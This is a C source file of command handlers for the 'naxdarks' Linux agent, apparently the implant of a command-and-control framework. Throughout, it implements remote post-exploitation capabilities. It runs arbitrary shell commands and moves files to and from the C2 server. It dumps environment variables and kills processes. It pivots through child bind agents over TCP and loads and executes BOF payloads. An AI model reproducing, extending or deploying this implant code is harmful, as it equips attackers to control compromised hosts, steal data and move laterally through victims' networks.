/* nax_linux/src/Commands/commands.c
 * Command handlers for the Linux naxdarks agent.
 * Each handler receives NaxTask* and must fill *out / *out_len.
 * Returns NAX_STATUS_OK (0x00) or NAX_STATUS_ERR (0x01).
 */

#include "nax_linux.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <stdarg.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

/* forward declaration */
const char *nax_read_lenstr(const uint8_t *, uint32_t, uint32_t *, uint32_t *);

/* ===== output buffer helpers ===== */

typedef struct {
    uint8_t *buf;
    uint32_t len;
    uint32_t cap;
} OutBuf;

static int ob_append(OutBuf *ob, const void *data, uint32_t dlen)
{
    if (ob->len + dlen > ob->cap) {
        uint32_t new_cap = ob->cap + dlen + 4096;
        uint8_t *nb = realloc(ob->buf, new_cap);
        if (!nb) return -1;
        ob->buf = nb;
        ob->cap = new_cap;
    }
    memcpy(ob->buf + ob->len, data, dlen);
    ob->len += dlen;
    return 0;
}

static int ob_appendf(OutBuf *ob, const char *fmt, ...)
{
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n <= 0) return 0;
    return ob_append(ob, tmp, (uint32_t)n);
}

/* ===== read args as NUL-terminated C string ===== */
static char *args_to_str(NaxTask *t)
{
    if (!t->args || t->args_len == 0) return NULL;
    /* args are len-prefixed; skip first 4 bytes (len) then read string */
    if (t->args_len < 4) return NULL;
    uint32_t off = 0;
    uint32_t sl  = 0;
    const char *s = nax_read_lenstr(t->args, t->args_len, &off, &sl);
    if (!s || sl == 0) return NULL;
    char *out = malloc(sl + 1);
    if (!out) return NULL;
    memcpy(out, s, sl);
    out[sl] = '\0';
    return out;
}

/* ===== cmd_whoami ===== */
static uint8_t cmd_whoami(NaxAgent *a, NaxTask *t,
                           uint8_t **out, uint32_t *out_len)
{
    (void)a; (void)t;
    char buf[512];
    /* Resolve user/group name directly — avoids NSS dlopen in static builds */
    char user_name[64] = "unknown";
    char grp_name[64]  = "unknown";
    {
        uid_t uid = getuid();
        FILE *fp = fopen("/etc/passwd", "r");
        if (fp) {
            char line[256]; unsigned u;
            while (fgets(line, sizeof(line), fp))
                if (sscanf(line, "%63[^:]:%*[^:]:%u:", user_name, &u) == 2 && u == (unsigned)uid)
                    break;
            fclose(fp);
        }
    }
    {
        gid_t gid = getgid();
        FILE *fp = fopen("/etc/group", "r");
        if (fp) {
            char line[256]; unsigned g;
            while (fgets(line, sizeof(line), fp))
                if (sscanf(line, "%63[^:]:%*[^:]:%u:", grp_name, &g) == 2 && g == (unsigned)gid)
                    break;
            fclose(fp);
        }
    }
    const char *user = user_name;
    const char *grp  = grp_name;

    int n = snprintf(buf, sizeof(buf),
        "User:  %s (uid=%u)\n"
        "Group: %s (gid=%u)\n"
        "Euid:  %u\n"
        "Egid:  %u\n",
        user, (unsigned)getuid(),
        grp,  (unsigned)getgid(),
        (unsigned)geteuid(),
        (unsigned)getegid());

    if (n > 0) {
        *out = malloc((uint32_t)n);
        if (*out) { memcpy(*out, buf, (uint32_t)n); *out_len = (uint32_t)n; }
    }
    return NAX_STATUS_OK;
}

/* ===== cmd_pwd ===== */
static uint8_t cmd_pwd(NaxAgent *a, NaxTask *t,
                        uint8_t **out, uint32_t *out_len)
{
    (void)a; (void)t;
    char buf[4096];
    if (!getcwd(buf, sizeof(buf))) {
        const char *err = strerror(errno);
        *out = (uint8_t *)strdup(err);
        *out_len = strlen(err);
        return NAX_STATUS_ERR;
    }
    size_t n = strlen(buf);
    *out = malloc(n); if (*out) { memcpy(*out, buf, n); *out_len = (uint32_t)n; }
    return NAX_STATUS_OK;
}

/* ===== cmd_cd ===== */
static uint8_t cmd_cd(NaxAgent *a, NaxTask *t,
                       uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *path = args_to_str(t);
    if (!path) {
        const char *h = getenv("HOME");
        if (!h) h = "/";
        chdir(h);
        *out = (uint8_t *)strdup(h);
        *out_len = strlen(h);
        return NAX_STATUS_OK;
    }
    if (chdir(path) < 0) {
        char buf[512];
        snprintf(buf, sizeof(buf), "cd: %s: %s", path, strerror(errno));
        free(path);
        *out = (uint8_t *)strdup(buf);
        *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    free(path);
    return cmd_pwd(a, t, out, out_len);
}

/* ===== cmd_ls ===== */
static uint8_t cmd_ls(NaxAgent *a, NaxTask *t,
                       uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *path = args_to_str(t);
    const char *dir_path = path ? path : ".";

    DIR *d = opendir(dir_path);
    if (!d) {
        char buf[512];
        snprintf(buf, sizeof(buf), "ls: %s: %s", dir_path, strerror(errno));
        if (path) free(path);
        *out = (uint8_t *)strdup(buf);
        *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }

    OutBuf ob = {0};
    ob_appendf(&ob, "%-8s  %-10s  %-20s  %s\n",
               "Type", "Size", "Last Modified", "Name");
    ob_appendf(&ob, "%-8s  %-10s  %-20s  %s\n",
               "----", "----", "-------------", "----");

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        char full[4096];
        snprintf(full, sizeof(full), "%s/%s", dir_path, ent->d_name);

        struct stat st;
        if (lstat(full, &st) < 0) continue;

        const char *type;
        if      (S_ISDIR(st.st_mode))  type = "dir";
        else if (S_ISLNK(st.st_mode))  type = "link";
        else if (S_ISREG(st.st_mode))  type = "file";
        else                            type = "other";

        char timebuf[32] = {0};
        struct tm *tm = localtime(&st.st_mtime);
        if (tm) strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", tm);

        ob_appendf(&ob, "%-8s  %-10lld  %-20s  %s\n",
                   type, (long long)st.st_size, timebuf, ent->d_name);
    }
    closedir(d);
    if (path) free(path);

    *out = ob.buf;
    *out_len = ob.len;
    return NAX_STATUS_OK;
}

/* ===== cmd_mkdir ===== */
static uint8_t cmd_mkdir(NaxAgent *a, NaxTask *t,
                          uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *path = args_to_str(t);
    if (!path) { *out = (uint8_t *)strdup("mkdir: path required"); *out_len = 20; return NAX_STATUS_ERR; }
    if (mkdir(path, 0755) < 0) {
        char buf[512];
        snprintf(buf, sizeof(buf), "mkdir: %s: %s", path, strerror(errno));
        free(path);
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    char buf[512];
    snprintf(buf, sizeof(buf), "Directory created: %s", path);
    free(path);
    *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
    return NAX_STATUS_OK;
}

/* ===== cmd_rmdir ===== */
static uint8_t cmd_rmdir(NaxAgent *a, NaxTask *t,
                          uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *path = args_to_str(t);
    if (!path) { *out = (uint8_t *)strdup("rmdir: path required"); *out_len = 20; return NAX_STATUS_ERR; }
    if (rmdir(path) < 0) {
        char buf[512];
        snprintf(buf, sizeof(buf), "rmdir: %s: %s", path, strerror(errno));
        free(path);
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    char buf[512];
    snprintf(buf, sizeof(buf), "Removed: %s", path);
    free(path);
    *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
    return NAX_STATUS_OK;
}

/* ===== cmd_rm ===== */
static uint8_t cmd_rm(NaxAgent *a, NaxTask *t,
                       uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *path = args_to_str(t);
    if (!path) { *out = (uint8_t *)strdup("rm: path required"); *out_len = 17; return NAX_STATUS_ERR; }
    if (unlink(path) < 0) {
        char buf[512];
        snprintf(buf, sizeof(buf), "rm: %s: %s", path, strerror(errno));
        free(path);
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    char buf[512];
    snprintf(buf, sizeof(buf), "Removed: %s", path);
    free(path);
    *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
    return NAX_STATUS_OK;
}

/* ===== cmd_cat ===== */
static uint8_t cmd_cat(NaxAgent *a, NaxTask *t,
                        uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *path = args_to_str(t);
    if (!path) { *out = (uint8_t *)strdup("cat: path required"); *out_len = 18; return NAX_STATUS_ERR; }

    FILE *f = fopen(path, "rb");
    if (!f) {
        char buf[512];
        snprintf(buf, sizeof(buf), "cat: %s: %s", path, strerror(errno));
        free(path);
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    free(path);

    OutBuf ob = {0};
    uint8_t tmp[4096];
    size_t r;
    while ((r = fread(tmp, 1, sizeof(tmp), f)) > 0)
        ob_append(&ob, tmp, (uint32_t)r);
    fclose(f);

    *out = ob.buf; *out_len = ob.len;
    return NAX_STATUS_OK;
}

/* ===== cmd_shell (/bin/sh -c cmd) ===== */
static uint8_t cmd_shell(NaxAgent *a, NaxTask *t,
                          uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *cmd = args_to_str(t);
    if (!cmd) { *out = (uint8_t *)strdup("shell: command required"); *out_len = 23; return NAX_STATUS_ERR; }

    int pipefd[2];
    if (pipe(pipefd) < 0) { free(cmd); return NAX_STATUS_ERR; }

    pid_t pid = fork();
    if (pid < 0) {
        free(cmd); close(pipefd[0]); close(pipefd[1]);
        return NAX_STATUS_ERR;
    }
    if (pid == 0) {
        /* child */
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/sh", "/bin/sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }

    /* parent */
    close(pipefd[1]);
    free(cmd);

    OutBuf ob = {0};
    uint8_t tmp[4096];
    ssize_t r;
    while ((r = read(pipefd[0], tmp, sizeof(tmp))) > 0)
        ob_append(&ob, tmp, (uint32_t)r);
    close(pipefd[0]);

    int status;
    waitpid(pid, &status, 0);

    *out = ob.buf; *out_len = ob.len;
    return NAX_STATUS_OK;
}

/* ===== cmd_ps — runs "ps auxf" for full process tree ===== */
static uint8_t cmd_ps(NaxAgent *a, NaxTask *t,
                       uint8_t **out, uint32_t *out_len)
{
    (void)a; (void)t;
    FILE *fp = popen("ps auxf 2>&1", "r");
    if (!fp) {
        const char *msg = "ps: popen failed";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }
    OutBuf ob = {0};
    char buf[4096];
    while (fgets(buf, sizeof(buf), fp))
        ob_append(&ob, (uint8_t *)buf, (uint32_t)strlen(buf));
    pclose(fp);
    *out = ob.buf; *out_len = ob.len;
    return NAX_STATUS_OK;
}

/* ===== cmd_ifconfig — network interfaces ===== */
static uint8_t cmd_ifconfig(NaxAgent *a, NaxTask *t,
                              uint8_t **out, uint32_t *out_len)
{
    (void)a; (void)t;
    /* Try ip addr first, fall back to ifconfig */
    FILE *fp = popen("ip addr 2>/dev/null || ifconfig 2>&1", "r");
    if (!fp) {
        const char *msg = "ifconfig: popen failed";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }
    OutBuf ob = {0};
    char buf[4096];
    while (fgets(buf, sizeof(buf), fp))
        ob_append(&ob, (uint8_t *)buf, (uint32_t)strlen(buf));
    pclose(fp);
    *out = ob.buf; *out_len = ob.len;
    return NAX_STATUS_OK;
}

/* ===== cmd_ps_kill ===== */
static uint8_t cmd_ps_kill(NaxAgent *a, NaxTask *t,
                            uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *arg = args_to_str(t);
    if (!arg) { *out = (uint8_t *)strdup("kill: PID required"); *out_len = 18; return NAX_STATUS_ERR; }
    int pid = atoi(arg); free(arg);
    if (kill((pid_t)pid, SIGKILL) < 0) {
        char buf[256];
        snprintf(buf, sizeof(buf), "kill: %d: %s", pid, strerror(errno));
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    char buf[64];
    snprintf(buf, sizeof(buf), "Killed PID %d", pid);
    *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
    return NAX_STATUS_OK;
}

/* ===== cmd_env ===== */
extern char **environ;
static uint8_t cmd_env(NaxAgent *a, NaxTask *t,
                        uint8_t **out, uint32_t *out_len)
{
    (void)a; (void)t;
    OutBuf ob = {0};
    for (char **e = environ; *e; e++) {
        ob_append(&ob, (const uint8_t *)*e, strlen(*e));
        ob_append(&ob, (const uint8_t *)"\n", 1);
    }
    *out = ob.buf; *out_len = ob.len;
    return NAX_STATUS_OK;
}


/* ===== cmd_exit ===== */
static uint8_t cmd_exit(NaxAgent *a, NaxTask *t,
                         uint8_t **out, uint32_t *out_len)
{
    (void)t;
    a->running = false;
    *out = (uint8_t *)strdup("Exiting...");
    *out_len = 10;
    return NAX_STATUS_OK;
}

/* ===== upload (recv file from C2 → write to disk) ===== */
static uint8_t cmd_upload(NaxAgent *a, NaxTask *t,
                           uint8_t **out, uint32_t *out_len)
{
    (void)a;
    /*   args layout:
     *   u32 path_len + path
     *   u32 data_len + data
    */
    if (!t->args || t->args_len < 8) {
        *out = (uint8_t *)strdup("upload: bad args"); *out_len = 16;
        return NAX_STATUS_ERR;
    }
    uint32_t off = 0, sl = 0;
    const char *path = nax_read_lenstr(t->args, t->args_len, &off, &sl);
    if (!path || sl == 0) {
        *out = (uint8_t *)strdup("upload: no path"); *out_len = 15;
        return NAX_STATUS_ERR;
    }
    char *fpath = malloc(sl + 1);
    memcpy(fpath, path, sl); fpath[sl] = '\0';

    uint32_t dlen = 0;
    const char *data = nax_read_lenstr(t->args, t->args_len, &off, &dlen);
    if (!data && dlen > 0) {
        free(fpath);
        *out = (uint8_t *)strdup("upload: no data"); *out_len = 15;
        return NAX_STATUS_ERR;
    }

    FILE *f = fopen(fpath, "wb");
    if (!f) {
        char buf[512];
        snprintf(buf, sizeof(buf), "upload: %s: %s", fpath, strerror(errno));
        free(fpath);
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    if (dlen > 0) fwrite(data, 1, dlen, f);
    fclose(f);

    char buf[512];
    snprintf(buf, sizeof(buf), "Uploaded %u bytes to %s", dlen, fpath);
    free(fpath);
    *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
    return NAX_STATUS_OK;
}

/* ===== download (read file from disk > send to C2) ===== */
static uint8_t cmd_download(NaxAgent *a, NaxTask *t,
                             uint8_t **out, uint32_t *out_len)
{
    (void)a;
    char *path = args_to_str(t);
    if (!path) { *out = (uint8_t *)strdup("download: path required"); *out_len = 23; return NAX_STATUS_ERR; }

    FILE *f = fopen(path, "rb");
    if (!f) {
        char buf[512];
        snprintf(buf, sizeof(buf), "download: %s: %s", path, strerror(errno));
        free(path);
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }

    /* Extract basename from path */
    const char *basename = strrchr(path, '/');
    basename = basename ? basename + 1 : path;
    uint32_t name_len = (uint32_t)strlen(basename);

    /* Response layout: [name_len(4LE)][name][file_data] */
    OutBuf ob = {0};
    /* Prepend name_len + name */
    uint8_t nl[4] = {
        (uint8_t)(name_len), (uint8_t)(name_len>>8),
        (uint8_t)(name_len>>16), (uint8_t)(name_len>>24)
    };
    ob_append(&ob, nl, 4);
    ob_append(&ob, (const uint8_t *)basename, name_len);

    free(path);

    uint8_t tmp[65536];
    size_t r;
    while ((r = fread(tmp, 1, sizeof(tmp), f)) > 0)
        ob_append(&ob, tmp, (uint32_t)r);
    fclose(f);

    *out = ob.buf; *out_len = ob.len;
    return NAX_STATUS_OK;
}

/* ===== ps_run (fork+exec, capture output) ===== */
static uint8_t cmd_ps_run(NaxAgent *a, NaxTask *t,
                           uint8_t **out, uint32_t *out_len)
{
    return cmd_shell(a, t, out, out_len);
}

/* ===== zip forward declaration (zip.c) ===== */
extern uint8_t nax_cmd_zip(NaxAgent *, NaxTask *, uint8_t **, uint32_t *);

/* ===== tunnel forward declarations (tunnel.c) ===== */
extern uint8_t nax_cmd_tunnel_connect_tcp(NaxAgent *, NaxTask *, uint8_t **, uint32_t *);
extern uint8_t nax_cmd_tunnel_write_tcp  (NaxAgent *, NaxTask *, uint8_t **, uint32_t *);
extern uint8_t nax_cmd_tunnel_close      (NaxAgent *, NaxTask *, uint8_t **, uint32_t *);
extern uint8_t nax_cmd_tunnel_reverse    (NaxAgent *, NaxTask *, uint8_t **, uint32_t *);
extern uint8_t nax_cmd_tunnel_pause      (NaxAgent *, NaxTask *, uint8_t **, uint32_t *);
extern uint8_t nax_cmd_tunnel_resume     (NaxAgent *, NaxTask *, uint8_t **, uint32_t *);

/* ===== pivot helpers ===== */

static NaxPivot *pivot_find(NaxAgent *a, uint32_t pivot_id)
{
    for (NaxPivot *p = a->pivot_head; p; p = p->next)
        if (p->pivot_id == pivot_id) return p;
    return NULL;
}

static void pivot_remove(NaxAgent *a, uint32_t pivot_id)
{
    NaxPivot **pp = &a->pivot_head;
    while (*pp) {
        NaxPivot *p = *pp;
        if (p->pivot_id == pivot_id) {
            if (p->sock >= 0) close(p->sock);
            *pp = p->next;
            free(p);
            return;
        }
        pp = &p->next;
    }
}

static void pivot_add(NaxAgent *a, int sock, uint32_t pivot_id)
{
    NaxPivot *p = (NaxPivot *)malloc(sizeof(NaxPivot));
    if (!p) { close(sock); return; }
    p->sock     = sock;
    p->pivot_id = pivot_id;
    p->next     = a->pivot_head;
    a->pivot_head = p;
}

/* ===== cmd_pivot_exec (0x37) ==============================================
 * Relay task data from C2 to the correct child pivot agent.
 * args: [pivot_id(4LE)][data_len(4LE)][data...]
 * ======================================================================== */
static uint8_t cmd_pivot_exec(NaxAgent *a, NaxTask *t,
                               uint8_t **out, uint32_t *out_len)
{
    *out     = NULL;
    *out_len = 0;

    if (!t->args || t->args_len < 8)
        return NAX_STATUS_OK;

    uint32_t pivot_id = (uint32_t)t->args[0] | ((uint32_t)t->args[1] << 8) |
                        ((uint32_t)t->args[2] << 16) | ((uint32_t)t->args[3] << 24);
    uint32_t data_len = (uint32_t)t->args[4] | ((uint32_t)t->args[5] << 8) |
                        ((uint32_t)t->args[6] << 16) | ((uint32_t)t->args[7] << 24);

    if (data_len == 0 || t->args_len < 8 + data_len)
        return NAX_STATUS_OK;

    NaxPivot *p = pivot_find(a, pivot_id);
    if (!p) return NAX_STATUS_OK;

    const uint8_t *data = t->args + 8;
    uint8_t hdr[4] = {
        (uint8_t)(data_len), (uint8_t)(data_len >> 8),
        (uint8_t)(data_len >> 16), (uint8_t)(data_len >> 24)
    };
    if (send(p->sock, hdr, 4, MSG_NOSIGNAL) != 4) {
        pivot_remove(a, pivot_id);
        return NAX_STATUS_OK;
    }
    ssize_t sent = 0;
    while ((uint32_t)sent < data_len) {
        ssize_t r = send(p->sock, data + sent, data_len - (uint32_t)sent, MSG_NOSIGNAL);
        if (r <= 0) { pivot_remove(a, pivot_id); return NAX_STATUS_OK; }
        sent += r;
    }
    return NAX_STATUS_OK;
}

/* helpers shared with tcp_bind.c — declared extern */
extern int tcp_recv_exact_pub(int sock, uint8_t *buf, uint32_t len);

static int cmd_link_lp_recv(int sock, uint8_t **out, uint32_t *out_len) {
    uint8_t hdr[4];
    ssize_t got = 0;
    while (got < 4) {
        ssize_t r = recv(sock, hdr+got, 4-got, 0);
        if (r <= 0) return -1;
        got += r;
    }
    uint32_t len = (uint32_t)hdr[0] | ((uint32_t)hdr[1]<<8) |
                   ((uint32_t)hdr[2]<<16) | ((uint32_t)hdr[3]<<24);
    if (!len || len > 4*1024*1024) return -1;
    *out = malloc(len);
    if (!*out) return -1;
    got = 0;
    while ((uint32_t)got < len) {
        ssize_t r = recv(sock, *out+got, len-got, 0);
        if (r <= 0) { free(*out); *out=NULL; return -1; }
        got += r;
    }
    *out_len = len;
    return 0;
}

/* ===== cmd_link (0x38) ================================================
 * Connect to a child Linux bind agent and register it as a pivot.
 *
 * args layout: link_type(1)=2 | port(2LE) | ip_len(4LE) | ip_bytes
 *
 * Result layout sent back to server (Go ProcessData reads this):
 *   link_type(1) | watermark(4LE) | beat(sessionId(16)+encrypted_register)
 *
 * The server's ProcessData calls TsListenerInternalHandler(wm, beat)
 * which creates the child agent and returns its ID, then TsPivotCreate
 * links parent↔child in the graph.
 * ====================================================================== */
static uint8_t cmd_link(NaxAgent *a, NaxTask *t,
                         uint8_t **out, uint32_t *out_len)
{
    if (!t->args || t->args_len < 8) {
        const char *msg = "link: args too short";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }

    uint8_t  link_type = t->args[0];
    if (link_type != 2) {
        const char *msg = "link: only tcp-bind (type=2) supported";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }
    uint16_t port   = (uint16_t)t->args[1] | ((uint16_t)t->args[2] << 8);
    uint32_t ip_len = (uint32_t)t->args[3]       |
                      (uint32_t)t->args[4] << 8   |
                      (uint32_t)t->args[5] << 16  |
                      (uint32_t)t->args[6] << 24;
    if (t->args_len < 7 + ip_len || ip_len == 0 || ip_len > 255) {
        const char *msg = "link: bad ip_len";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }
    char ip[256];
    memcpy(ip, t->args + 7, ip_len);
    ip[ip_len] = '\0';

    /* Connect to child bind agent */
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_NUMERICHOST;
    if (getaddrinfo(ip, port_str, &hints, &res) != 0) {
        char buf[256];
        snprintf(buf, sizeof(buf), "link: getaddrinfo %s:%u failed", ip, port);
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    int csock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (csock < 0 || connect(csock, res->ai_addr, res->ai_addrlen) < 0) {
        freeaddrinfo(res);
        if (csock >= 0) close(csock);
        char buf[256];
        snprintf(buf, sizeof(buf), "link: connect %s:%u failed: %s", ip, port, strerror(errno));
        *out = (uint8_t *)strdup(buf); *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    freeaddrinfo(res);

    /* Read the child's REGISTER beat (length-prefixed) */
    uint8_t  *beat     = NULL;
    uint32_t  beat_len = 0;
    if (cmd_link_lp_recv(csock, &beat, &beat_len) < 0 || beat_len < 20) {
        close(csock);
        const char *msg = "link: failed to read child beat";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }

    /* Child beat layout (v2): [wm(4)][aes_key(16)][sessionId(16)][encrypted_register]
     * Build result for ProcessData/InternalHandler:
     *   [link_type(1)][wm(4)][aes_key(16)][sessionId(16)][encrypted_register]
     * InternalHandler uses aes_key to correctly register the child
     * regardless of which transport the parent uses. */
    if (beat_len < 36) { /* wm(4) + key(16) + sid(16) minimum */
        free(beat); close(csock);
        const char *msg = "link: child beat too short";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }
    uint32_t wm = (uint32_t)beat[0] | ((uint32_t)beat[1]<<8) |
                  ((uint32_t)beat[2]<<16) | ((uint32_t)beat[3]<<24);

    /* result = link_type(1) + wm(4) + beat_without_wm(beat_len-4)
     * beat_without_wm = [aes_key(16)][sessionId(16)][encrypted_register] */
    uint32_t result_len = 1 + beat_len; /* 1 for link_type, rest is full beat */
    uint8_t *result = malloc(result_len);
    if (!result) {
        free(beat); close(csock);
        const char *msg = "link: out of memory";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }
    result[0] = link_type;
    result[1] = (uint8_t)(wm);
    result[2] = (uint8_t)(wm >> 8);
    result[3] = (uint8_t)(wm >> 16);
    result[4] = (uint8_t)(wm >> 24);
    memcpy(result + 5, beat + 4, beat_len - 4); /* aes_key + sessionId + encrypted_register */
    free(beat);

    pivot_add(a, csock, t->task_id);  /* task_id == pivot_id assigned by server */
    *out     = result;
    *out_len = result_len;
    return NAX_STATUS_OK;
}

/* ===== cmd_unlink (0x39) ===== */
static uint8_t cmd_unlink(NaxAgent *a, NaxTask *t,
                            uint8_t **out, uint32_t *out_len)
{
    if (!t->args || t->args_len < 4) {
        const char *msg = "unlink: pivot_id required";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
        return NAX_STATUS_ERR;
    }
    uint32_t pivot_id = (uint32_t)t->args[0] | ((uint32_t)t->args[1] << 8) |
                        ((uint32_t)t->args[2] << 16) | ((uint32_t)t->args[3] << 24);
    NaxPivot *p = pivot_find(a, pivot_id);
    if (p) {
        pivot_remove(a, pivot_id);
        const char *msg = "unlink: child pivot disconnected";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
    } else {
        const char *msg = "unlink: pivot not found";
        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
    }
    return NAX_STATUS_OK;
}

/* ===== BOF execution ===== */
/* Wire: [bof_size(4LE)][bof_bytes][args_size(4LE)][args]  — entry always "go" */
#include "elf_bof.h"
#include "bof_async.h"

static uint8_t cmd_bof(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
    (void)a;
    if (!t->args || t->args_len < 8) {
        *out = (uint8_t *)strdup("bof: insufficient data");
        *out_len = (uint32_t)strlen((char *)*out);
        return NAX_STATUS_ERR;
    }

    uint8_t *p = t->args;
    uint32_t rem = t->args_len;

    /* Read BOF content */
    if (rem < 4) goto bad;
    uint32_t bof_size = p[0] | (p[1]<<8) | (p[2]<<16) | (p[3]<<24);
    p += 4; rem -= 4;
    if (bof_size > rem) goto bad;
    const uint8_t *bof_data = p;
    p += bof_size; rem -= bof_size;

    /* Read packed args */
    uint32_t bof_args_len = 0;
    const uint8_t *bof_args = NULL;
    if (rem >= 4) {
        bof_args_len = p[0] | (p[1]<<8) | (p[2]<<16) | (p[3]<<24);
        p += 4; rem -= 4;
        if (bof_args_len > 0 && bof_args_len <= rem) {
            bof_args = p;
        } else {
            bof_args_len = 0;
        }
    }

    /* Execute BOF — entry is always "go" */
    char *bof_output = NULL;
    uint32_t bof_output_len = 0;
    int rc = nax_bof_execute(bof_data, bof_size,
                             bof_args, bof_args_len,
                             "go",
                             &bof_output, &bof_output_len);

    if (bof_output && bof_output_len > 0) {
        *out = (uint8_t *)bof_output;
        *out_len = bof_output_len;
    } else {
        *out = (uint8_t *)strdup(rc == 0 ? "(no output)" : "BOF execution failed");
        *out_len = (uint32_t)strlen((char *)*out);
        if (bof_output) free(bof_output);
    }

    return (rc == 0) ? NAX_STATUS_OK : NAX_STATUS_ERR;

bad:
    *out = (uint8_t *)strdup("bof: malformed args");
    *out_len = (uint32_t)strlen((char *)*out);
    return NAX_STATUS_ERR;
}

/* ===== profile update (HTTPS only) ===== */
#ifdef NAX_HTTPS_MODE
extern void nax_apply_profile(const uint8_t *data, uint32_t data_len);
extern void nax_profile_set_pending(const uint8_t *data, uint32_t data_len);
#endif

static uint8_t cmd_profile_update(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
#ifdef NAX_HTTPS_MODE
    if (!t->args || t->args_len < 4) {
        *out = (uint8_t *)strdup("profile_update: no profile data");
        *out_len = (uint32_t)strlen((char *)*out);
        return NAX_STATUS_ERR;
    }
    nax_profile_set_pending(t->args, t->args_len);
    a->cfg.profile_burst_until = time(NULL) + 1; /* 1seg en modo rafaga para actualizar el perfil en runtime */
    *out = (uint8_t *)strdup("Profile queued — applying on next heartbeat");
    *out_len = (uint32_t)strlen((char *)*out);
    return NAX_STATUS_OK;
#else
    (void)t;
    *out = (uint8_t *)strdup("profile_update: only available in HTTPS mode");
    *out_len = (uint32_t)strlen((char *)*out);
    return NAX_STATUS_ERR;
#endif
}

/* ===== BOF async ===== */

static uint8_t cmd_bof_async(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
    (void)a;
    if (!t->args || t->args_len < 8) {
        *out = (uint8_t *)strdup("bof async: insufficient data");
        *out_len = (uint32_t)strlen((char *)*out);
        return NAX_STATUS_ERR;
    }

    uint8_t *p = t->args;
    uint32_t rem = t->args_len;

    if (rem < 4) goto bad;
    uint32_t bof_size = p[0] | (p[1]<<8) | (p[2]<<16) | (p[3]<<24);
    p += 4; rem -= 4;
    if (bof_size > rem) goto bad;
    const uint8_t *bof_data = p;
    p += bof_size; rem -= bof_size;

    uint32_t bof_args_len = 0;
    const uint8_t *bof_args = NULL;
    if (rem >= 4) {
        bof_args_len = p[0] | (p[1]<<8) | (p[2]<<16) | (p[3]<<24);
        p += 4; rem -= 4;
        if (bof_args_len > 0 && bof_args_len <= rem) bof_args = p;
        else bof_args_len = 0;
    }

    int idx = nax_async_start(t->task_id, bof_data, bof_size, bof_args, bof_args_len);
    if (idx < 0) {
        *out = (uint8_t *)strdup("bof async: all job slots busy (max 8)");
        *out_len = (uint32_t)strlen((char *)*out);
        return NAX_STATUS_ERR;
    }

    /* Don't send result now — async_drain will send it when the BOF completes */
    *out = NULL;
    *out_len = 0;
    return NAX_STATUS_ASYNC;

bad:
    *out = (uint8_t *)strdup("bof async: malformed args");
    *out_len = (uint32_t)strlen((char *)*out);
    return NAX_STATUS_ERR;
}

